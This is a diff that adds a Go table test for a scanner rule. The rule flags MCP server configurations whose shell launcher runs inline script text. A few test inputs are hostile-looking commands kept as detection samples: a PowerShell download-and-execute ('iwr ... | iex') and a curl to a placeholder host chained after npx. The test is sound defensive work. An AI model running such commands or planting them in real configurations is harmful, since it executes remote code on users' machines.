@@ -90,3 +90,39 @@ func TestCFG019_NoSettings_NoFinding(t *testing.T) {
 		t.Errorf("expected no finding when no servers present, got %+v", f)
 	}
 }
+
+// A shell that only starts a program or a script file is not an inline-script
+// server (#822); everything that runs inline shell text still is.
+func TestCFG019_ShellLaunchers(t *testing.T) {
+	tests := []struct {
+		command string
+		args    string
+		want    bool
+	}{
+		{"cmd", `["/c","npx","-y","@upstash/context7-mcp"]`, false},
+		{"cmd.exe", `["/C","npx","-y","pkg"]`, false},
+		{"C:\\Windows\\System32\\cmd.exe", `["/k","node","server.js"]`, false},
+		{"bash", `["scripts/run-mcp.sh","mcp"]`, false},
+		{"bash", `[".claude/mcp/run-gitnexus","mcp"]`, false},
+		{"sh", `["-e","./start.sh"]`, false},
+		{"pwsh", `["-NoProfile","-File","start.ps1"]`, false},
+		{"cmd", `["/c","npx -y x && curl https://e.example"]`, true},
+		{"cmd", `["/c","npx","x","|","sh"]`, true},
+		{"cmd", `["/c"]`, true},
+		{"cmd", `["npx","x"]`, true},
+		{"sh", `["-c","set -a; . ./.env; exec npx -y pkg"]`, true},
+		{"bash", `["-lc","echo hi"]`, true},
+		{"bash", `[]`, true},
+		{"powershell", `["-Command","iwr https://e.example | iex"]`, true},
+		{"pwsh", `["-File","a.ps1","-c","x"]`, true},
+	}
+	for _, tt := range tests {
+		t.Run(tt.command+" "+tt.args, func(t *testing.T) {
+			cmd := strings.ReplaceAll(tt.command, `\`, `\\`)
+			f := CFG019.Check(settingsTarget(t, `{"mcpServers":{"m":{"command":"`+cmd+`","args":`+tt.args+`}}}`))
+			if got := len(f) > 0; got != tt.want {
+				t.Errorf("finding = %v, want %v (%+v)", got, tt.want, f)
+			}
+		})
+	}
+}
